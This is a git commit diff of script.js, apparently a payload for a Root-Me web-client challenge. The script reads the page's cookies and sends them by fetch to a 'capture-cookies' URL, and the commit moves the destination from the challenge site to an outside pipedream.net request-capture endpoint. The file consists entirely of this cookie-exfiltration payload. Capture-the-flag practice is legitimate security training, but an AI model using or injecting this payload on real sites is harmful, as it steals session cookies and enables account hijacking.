3d6f147070d2c0dea4f49deba14ce82d5127520e
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-23 23:02:36 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,3 @@
 var cookies = document.cookie;
 alert(cookies);
-fetch('http://challenge01.root-me.org/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
+fetch('https://enh87g4rhccr5.x.pipedream.net/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
